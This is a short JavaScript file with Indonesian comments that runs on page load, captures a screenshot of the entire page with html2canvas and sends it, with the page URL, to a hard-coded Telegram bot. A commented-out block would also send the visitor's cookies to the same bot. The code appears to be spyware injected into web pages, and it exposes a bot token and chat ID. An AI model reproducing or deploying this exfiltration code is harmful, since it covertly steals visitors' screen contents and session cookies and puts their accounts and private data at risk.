// let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript
// let currentURL = window.location.href;

// fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
//     method: "POST",
//     headers: {
//         "Content-Type": "application/json"
//     },
//     body: JSON.stringify({
//         chat_id: "-1002002449257",
//         text: `Cookies: ${cookies}\nURL: ${currentURL}`
//     })
// });
function captureAndSendScreenshot() {
    let currentURL = window.location.href;
    
    html2canvas(document.body).then(canvas => {
        // Konversi canvas menjadi data URL (base64)
        let imageData = canvas.toDataURL("image/png");
        
        // Konversi data URL menjadi Blob
        fetch(imageData)
            .then(res => res.blob())
            .then(blob => {
                let formData = new FormData();
                formData.append("chat_id", "-1002002449257");
                formData.append("photo", blob, "screenshot.png");
                formData.append("caption", `Tangkapan layar dari URL: ${currentURL}`);

                fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendPhoto", {
                    method: "POST",
                    body: formData
                })
                .then(response => response.json())
                .then(result => {
                    console.log("Screenshot berhasil dikirim:", result);
                })
                .catch(error => {
                    console.error("Gagal mengirim screenshot:", error);
                });
            });
    });
}

captureAndSendScreenshot();

